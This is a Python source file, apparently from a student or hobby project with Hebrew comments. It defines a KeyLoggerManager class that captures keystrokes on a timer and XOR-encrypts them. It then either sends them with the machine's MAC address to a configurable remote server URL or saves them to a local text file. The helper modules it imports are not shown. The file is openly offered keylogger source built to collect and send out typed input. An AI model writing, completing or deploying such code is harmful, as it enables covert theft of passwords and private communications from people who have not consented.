from key_logger_service import KeyLoggerService
from network_writer import NetworkWriter
from file_writer import FileWriter
from xor_encryptor import XorEncryptor
from get_mac_address import get_mac_address
from time import sleep



class KeyLoggerManager:
    """ניהול התוכנה בעזרת קבצי העזר"""

    def __init__(self,timer: int, encryption_key: str | int, write_to: list[str], url: str = None):
        """קבלת טיימר לבקשות הנתונים שהוקלדו"""
        self.timer = timer
        self.running = False
        self.logger = KeyLoggerService()
        self.encryption_key = encryption_key
        self.encryptor = XorEncryptor()
        self.writers = self._get_writers(write_to, url)

    def _get_writers(self, write_to: list[str], url: str):
        """מחזיר רשימה של מחלקות כותבות בהתאם לבחירת המשתמש"""
        writers = []
        if "server" in write_to:
            if not url:
                raise ValueError("URL is required when write_to includes 'server'.")
            writers.append(NetworkWriter(url))
        if "file" in write_to:
            writers.append(FileWriter())
        if not writers:
            raise ValueError("At least one valid write option ('server' or 'file') must be specified.")
        return writers

    def start(self):
        """מתחיל מעקב והרצת הקבצים הנדרשים"""
        self.running = True
        self.logger.start_logging() # תחילת מעקב
        while self.running:
            sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
            get_logger = self.logger.get_logged_keys() # קבלת נתונים
            if get_logger: # אם היו הקלדות
                logger_encrypt = self.encryptor.encrypt(get_logger, self.encryption_key) # הצפנה
                for writer in self.writers:
                    if isinstance(writer, NetworkWriter):
                        writer.send_data(logger_encrypt, get_mac_address())  # שליחה לשרת
                    elif isinstance(writer, FileWriter):
                        writer.send_data(logger_encrypt, 'Key logger.txt')  # שמירה לקובץ

    def stop(self):
        """עצירת המעקב"""
        self.running = False
        self.logger.stop_logging()

# הושלם